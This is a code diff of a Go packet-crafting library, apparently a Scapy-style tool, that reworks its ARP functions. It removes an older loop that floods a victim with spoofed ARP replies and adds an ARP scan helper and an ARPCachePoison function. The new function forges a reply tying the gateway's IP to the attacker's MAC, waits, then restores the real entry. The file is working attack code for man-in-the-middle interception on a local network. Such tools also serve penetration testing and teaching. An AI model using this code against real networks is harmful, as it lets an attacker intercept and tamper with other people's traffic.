@@ -1,59 +1,113 @@
 package higherlevel
 
 import (
-	"fmt"
-	"log"
 	"net"
 	"time"
 
-	craft "github.com/tiagomdiogo/GoPpy/packet"
-	socket "github.com/tiagomdiogo/GoPpy/supersocket"
+	"github.com/google/gopacket/layers"
+	"github.com/tiagomdiogo/GoPpy/packet"
+	"github.com/tiagomdiogo/GoPpy/supersocket"
 	utils "github.com/tiagomdiogo/GoPpy/utils"
 )
 
-func arpcachepoisoning(interfaceName string, victimsIP string, gatewayIPs string) {
-	// Initialize the SuperSocket
-	ss, err := socket.NewSuperSocket(interfaceName, "")
+func ARPScan(iface string, targetIP string) (string, error) {
+	// Get MAC address of interface
+	srcMAC, err := utils.GetMACAddress(iface)
 	if err != nil {
-		log.Fatalf("Failed to create SuperSocket: %v", err)
+		return "", err
 	}
 
-	// Get your (attacker) MAC address
-	attackerMAC, err := utils.GetMACAddress(interfaceName)
+	// Get IP address of interface
+	srcIP, err := utils.ParseIPGen(iface)
 	if err != nil {
-		log.Fatalf("Failed to parse attacker MAC address: %v", err)
+		return "", err
 	}
 
-	// Get the victim's IP address
-	victimIP := net.ParseIP(victimsIP)
-	if victimIP == nil {
-		log.Fatalf("Failed to parse victim IP address")
+	// Create a new SuperSocket
+	ss, err := supersocket.NewSuperSocket(iface, "")
+	if err != nil {
+		return "", err
 	}
 
-	// Get the gateway's IP address
-	gatewayIP := net.ParseIP(gatewayIPs)
-	if gatewayIP == nil {
-		log.Fatalf("Failed to parse gateway IP address")
+	// Craft ARP request packet
+	arpRequest, err := packet.CraftARPPacket(srcIP, targetIP, srcMAC, "ff:ff:ff:ff:ff:ff", false)
+	if err != nil {
+		return "", err
 	}
 
-	// Run the ARP cache poisoning attack indefinitely
+	// Send ARP request
+	err = ss.Send(arpRequest)
+	if err != nil {
+		return "", err
+	}
+
+	// Read packets
 	for {
-		// Craft the ARP reply packet
-		packet, err := craft.CraftARPPacket(attackerMAC, "ff:ff:ff:ff:ff:ff", gatewayIP.String(), victimIP.String())
+		pkt, err := ss.Recv()
 		if err != nil {
-			log.Fatalf("Failed to craft ARP packet: %v", err)
+			return "", err
 		}
 
-		// Send the ARP reply packet
-		err = ss.Send(packet)
-		if err != nil {
-			log.Fatalf("Failed to send ARP packet: %v", err)
+		// Parse the packet
+		arpLayer := utils.GetARPLayer(pkt)
+
+		if arpLayer != nil && arpLayer.Operation == layers.ARPReply && net.IP(arpLayer.SourceProtAddress).String() == targetIP {
+			return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
 		}
-
-		// Print a message for each packet sent
-		fmt.Printf("ARP reply sent to %s: %s is at %s\n", victimIP, gatewayIP, attackerMAC)
-
-		// Wait a bit before sending the next packet
-		time.Sleep(1 * time.Second)
 	}
+}
+
+func ARPCachePoison(iface string, targetIP string, gatewayIP string) error {
+	// Get MAC address of interface
+	srcMAC, err := utils.GetMACAddress(iface)
+	if err != nil {
+		return err
+	}
+
+	// Get the MAC address of the target
+	targetMAC, err := ARPScan(iface, targetIP)
+	if err != nil {
+		return err
+	}
+
+	// Get the MAC address of the gateway
+	gatewayMAC, err := ARPScan(iface, gatewayIP)
+	if err != nil {
+		return err
+	}
+
+	// Create a new SuperSocket
+	ss, err := supersocket.NewSuperSocket(iface, "")
+	if err != nil {
+		return err
+	}
+
+	// Craft ARP reply packet to poison target's ARP cache
+	arpReply, err := packet.CraftARPPacket(gatewayIP, targetIP, srcMAC, targetMAC, true)
+	if err != nil {
+		return err
+	}
+
+	// Send the ARP reply to the target
+	err = ss.Send(arpReply)
+	if err != nil {
+		return err
+	}
+
+	// Wait for some time (e.g. 10 seconds). This duration depends on the duration of your attack.
+	time.Sleep(10 * time.Second)
+
+	// Craft ARP reply packet with the legitimate MAC of the gateway to restore the original ARP entry
+	arpReplyLegit, err := packet.CraftARPPacket(gatewayIP, targetIP, gatewayMAC, targetMAC, true)
+	if err != nil {
+		return err
+	}
+
+	// Send the legitimate ARP reply to the target
+	err = ss.Send(arpReplyLegit)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
